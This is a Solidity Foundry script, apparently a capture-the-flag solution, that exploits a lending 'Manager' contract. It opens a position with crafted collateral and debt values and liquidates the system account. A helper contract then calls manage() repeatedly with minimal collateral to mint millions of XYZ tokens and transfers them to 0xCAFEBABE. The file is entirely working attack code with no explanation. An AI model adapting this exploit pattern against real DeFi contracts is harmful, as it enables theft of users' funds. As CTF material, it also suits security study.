// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {Challenge} from "../src/xyz/Challenge.sol";
import {Manager} from "../src/xyz/Manager.sol";
import {Token} from "../src/xyz/Token.sol";
import {ERC20Signal} from "../src/xyz/ERC20Signal.sol";
import {PriceFeed} from "../src/xyz/PriceFeed.sol";

contract ExploitScript is Script {
    Token public sETH;
    Token public XYZ;
    Manager public manager;
    Challenge public challenge;
    ERC20Signal public collatoralToken;
    ERC20Signal public debtToken;
    PriceFeed public priceFeed;
    address public player;
    address public system;

    function setUp() public {
        challenge = Challenge(
            address(0x69A437B3F8e3d20A14B75239c034B919ca5225C0)
        );
        player = address(0xfFaF486937BaE61e83b45eAeB2278Ce43c5dFbE1);
        XYZ = challenge.xyz();
        sETH = challenge.seth();
        system = sETH.manager();
        manager = challenge.manager();
        (collatoralToken, debtToken, priceFeed, , ) = manager.collateralData(
            IERC20(address(sETH))
        );
    }

    function run() public {
        vm.startBroadcast();
        sETH.approve(address(manager), type(uint256).max);
        manager.manage(sETH, 212e16 + 1, true, 3600e18, true);
        sETH.transfer(address(manager), sETH.balanceOf(player));
        manager.liquidate(system);
        ExploitHelper exploitHelper = new ExploitHelper(sETH, XYZ, manager);
        sETH.transfer(address(exploitHelper), sETH.balanceOf(player));
        for (uint i = 0; i < 50; i++) {
            exploitHelper.execute();
        }
        vm.stopBroadcast();
    }
}

contract ExploitHelper {
    Token public sETH;
    Token public XYZ;
    Manager public manager;

    constructor(Token _sETH, Token _XYZ, Manager _manager) {
        sETH = _sETH;
        XYZ = _XYZ;
        manager = _manager;
    }

    function execute() public {
        uint256 startBalance = XYZ.balanceOf(address(this));
        sETH.approve(address(manager), type(uint256).max);
        while (XYZ.balanceOf(address(this)) < startBalance + 5_000_000 ether) {
            manager.manage(sETH, 1, true, 93e21, true);
        }
        XYZ.transfer(address(0xCAFEBABE), 5_000_000 ether);
    }
}
